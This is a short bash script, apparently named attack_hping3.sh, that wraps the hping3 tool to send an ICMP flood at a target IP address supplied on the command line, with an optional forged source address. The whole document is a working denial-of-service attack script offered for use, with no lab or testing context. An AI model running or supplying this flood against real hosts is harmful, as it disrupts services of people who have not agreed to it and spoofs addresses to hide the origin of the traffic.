#!/bin/bash

TARGET_IP=$1
COUNT=$2
SPOOF_IP=$3

if [ -z "$TARGET_IP" ] || [ -z "$COUNT" ]; then
    echo "Usage:"
    echo "./attack_hping3.sh <target_ip> <count> [spoof_ip]"
    exit 1
fi

echo "Starting hping3 ICMP flood..."

if [ -z "$SPOOF_IP" ]; then
    sudo hping3 --icmp -c "$COUNT" "$TARGET_IP"
else
    sudo hping3 --icmp -a "$SPOOF_IP" -c "$COUNT" "$TARGET_IP"
fi
